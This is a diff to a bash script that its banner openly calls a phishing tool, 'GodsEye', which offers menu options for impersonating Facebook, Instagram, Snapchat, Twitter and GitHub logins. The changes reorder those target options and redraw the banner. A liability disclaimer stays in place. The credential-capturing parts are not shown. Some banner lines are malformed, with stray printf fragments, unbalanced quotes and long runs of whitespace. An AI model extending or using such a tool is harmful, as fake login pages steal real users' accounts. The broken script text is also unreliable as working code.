@@ -27,17 +27,17 @@ read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' op
 
 
 if [[ $option == 1 || $option == 01 ]]; then
-server="instagram"
+server="facebook"
 start1
 
 elif [[ $option == 2 || $option == 02 ]]; then
-server="facebook"
+server="instagram"
 start1
 elif [[ $option == 3 || $option == 03 ]]; then
-server="snapchat"
+server="twitter"
 start1
 elif [[ $option == 4 || $option == 04 ]]; then
-server="twitter"
+server="snapchat"
 start1
 elif [[ $option == 5 || $option == 05 ]]; then
 server="github"
@@ -130,14 +130,15 @@ fi
 }
 
 banner() {          
-printf "\e[1;77m      ___    __   __   ___   ___ _  _ ___   \e[0m\n"
-printf "\e[1;77m      |   _ |  | |  \  |__   |__ \__/ |__   \e[0m\n"	
-printf "\e[1;77m      |__|  |__| |___|  __|  |__  ||  |__   \e[0m\n"                                                                    				 \e[0m\n"printf "\e[1;77m   																						 \e[0m\n"
-       																					  
-      																					
-   																						  																					\e[0m\n"
+printf "\e[1;77m       ██████  █████  ██████  ███████     ███████ ██    ██ ███████  \e[0m\n"
+printf "\e[1;77m       ██      ██ ██   ██ ██  ██          ██       ██  ██  ██       \e[0m\n"
+printf "\e[1;77m       ██ ████ ██ ██   ██ ██  ███████     ███████   ████   ███████  \e[0m\n"
+printf "\e[1;77m       ██   ██ ██ ██   ██ ██       ██     ██         ██    ██       \e[0m\n"
+printf "\e[1;77m       ███████ █████  ██████  ███████     ███████    ██    ███████  \e[0m\n"
+
+                                             																						     																					   																						  																					\e[0m\n"
 printf "\n"
-printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by:  @0secdevil \e[0m\e[1;93m.:.:.\e[0m\n"
+printf "\e[1;93m       .:.:.\e[0m\e[1;77m  Phishing Tool coded by:  @0secdevil \e[0m\e[1;93m.:.:.\e[0m\n"
 printf "\n"
 printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
 printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by GodsEye ::\e[0m\n"
